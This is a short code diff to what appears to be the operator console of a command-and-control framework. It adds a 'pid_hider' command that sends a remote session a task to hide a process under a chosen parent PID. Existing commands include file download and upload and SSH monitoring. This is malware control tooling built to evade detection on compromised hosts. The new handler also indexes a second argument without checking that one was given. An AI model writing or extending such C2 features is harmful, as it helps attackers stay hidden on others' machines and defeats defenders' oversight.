@@ -57,6 +57,7 @@ cmds_session = WordCompleter(
         "download",
         "ps",
         "ssh_monitor",
+        "pid_hider",
         "tasking",
         "view",
         "delete",
@@ -448,6 +449,8 @@ def session_router(
             handle_delete(token, server, session_id, tasking_id)
         case "ssh_monitor":
             handle_ssh_monitor(token, server, session_id, args)
+        case "pid_hider":
+            handle_pid_hider(token, server, session_id, args)
         case "download":
             handle_download(token, server, session_id, args)
         case "upload":
@@ -566,6 +569,18 @@ def handle_ssh_monitor(token: str, server: str, session_id: str, args: list) -> 
         send_task(token, server, session_id, "ssh_monitor", args[0])
     else:
         print_formatted_text("[*] Expecting command -> ssh_monitor on|off")
+
+def handle_pid_hider(token: str, server: str, session_id: str, args: list) -> None:
+    if len(args) == 0:
+        print_formatted_text("[*] Expecting command -> pid_hider <pid> <targetPPID>")
+        return 
+
+    for arg in args:
+        if not arg.isdigit():
+            print_formatted_text("[*] Expecting command -> pid_hider <pid> <targetPPID>")
+            return 
+
+    send_task(token, server, session_id, "pid_hider", args[0].strip() + " " + args[1].strip())
 
 
 def handle_upload(token: str, server: str, session_id: str, args: list) -> None:
